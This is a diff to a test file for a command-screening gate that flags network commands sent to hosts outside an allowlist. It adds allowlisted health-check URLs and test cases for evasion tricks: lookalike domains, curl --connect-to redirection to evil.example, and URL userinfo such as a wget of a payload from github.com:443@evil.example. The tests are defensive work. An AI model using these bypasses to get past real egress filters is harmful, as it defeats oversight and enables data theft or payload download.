@@ -36,6 +36,8 @@ test("allowlisted hosts do not trip the gate", () => {
   const quiet = [
     "curl https://github.com/IgorGanapolsky/ThumbGate",
     "npm install --registry https://registry.npmjs.org",
+    "curl -s https://thumbgate-production.up.railway.app/health",
+    "curl -s https://thumbgate.ai/health",
   ];
   for (const cmd of quiet) {
     assert.strictEqual(re().test(cmd), false, `expected no warn for: ${cmd}`);
@@ -65,8 +67,22 @@ test("allowlisted host as a prefix of an attacker domain still trips the gate", 
     "open https://github.com.evil.com/x",
     "open https://api.anthropic.com.attacker.net/v1",
     "open https://registry.npmjs.org.evil.com",
+    "open https://thumbgate.ai.evil.com/x",
+    "open https://thumbgate-production.up.railway.app.evil.com/x",
     "open https://localhost.evil.com/x",
     "curl https://evil.com/?ref=localhost",
+  ];
+  for (const cmd of loud) {
+    assert.strictEqual(re().test(cmd), true, `expected warn for: ${cmd}`);
+  }
+});
+
+
+test("curl connect-to and URL userinfo bypasses still trip the gate", () => {
+  const loud = [
+    "curl --connect-to thumbgate.ai:443:evil.example:443 https://thumbgate.ai/health",
+    "curl https://thumbgate.ai:443@evil.example/x",
+    "wget https://github.com:443@evil.example/payload",
   ];
   for (const cmd of loud) {
     assert.strictEqual(re().test(cmd), true, `expected warn for: ${cmd}`);
